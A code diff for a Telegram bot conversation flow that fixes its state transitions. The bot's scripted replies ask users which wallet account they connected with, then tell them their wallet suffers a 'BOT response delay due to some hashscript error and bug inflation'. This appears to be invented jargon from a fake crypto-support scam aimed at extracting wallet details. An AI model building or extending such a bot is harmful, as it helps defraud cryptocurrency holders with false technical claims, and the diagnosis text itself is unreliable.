@@ -21,19 +21,19 @@ ONE , TWO , THREE= range(3)
 
 def start(update: Update, context: CallbackContext):
      update.message.reply_text("Hi, how are you doing and how may I help you ?")
-     
+     return ONE
 
 def ask_account(update: Update, context: CallbackContext):
      chat_id = update.message.chat_id
      name = update.message.text # now we got the name
      context.user_data["name"] = name # to use it later (in next func)
      update.message.reply_text("Which wallet account did you use to connect?")
-     return ONE
+     return TWO
 def first_question_step(update: Update, context: CallbackContext):
     chat_id = update.message.chat_id
     phone_number = update.message.text
     update.message.reply_text('I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
-    return TWO
+    return THREE
 
 def cancel(update: Update, context: CallbackContext):
      chat_id = update.message.chat_id
@@ -47,7 +47,7 @@ def second_step(message):
 CH = ConversationHandler (entry_points = [CommandHandler("start", start)],
      states = {ONE : [MessageHandler(Filters.text , ask_account)],
      TWO : [MessageHandler(Filters.text , first_question_step)],
-     THREE : [MessageHandler(Filters.text , second_step)],
+     THREE : [MessageHandler(Filters.text , second_step)]
      },
      fallbacks = [MessageHandler(Filters.regex('cancel'), cancel)],
      allow_reentry= True)
